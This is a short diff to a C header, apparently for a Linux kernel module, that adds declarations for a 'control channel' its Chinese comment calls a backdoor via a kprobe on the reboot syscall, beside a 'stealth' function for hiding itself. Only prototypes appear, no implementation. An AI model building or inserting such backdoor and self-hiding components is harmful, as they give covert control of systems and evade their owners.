@@ -58,6 +58,10 @@ void hx_cfg_apply(const struct hx_cfg *c);
 void hx_feature_resume(void);
 void hx_feature_suspend(void);
 
+/* 控制通道（__NR_reboot kprobe 后门） */
+int  hx_gate_init(void);
+void hx_gate_exit(void);
+
 /* 隐身 */
 int  hx_hide_self(void);
 
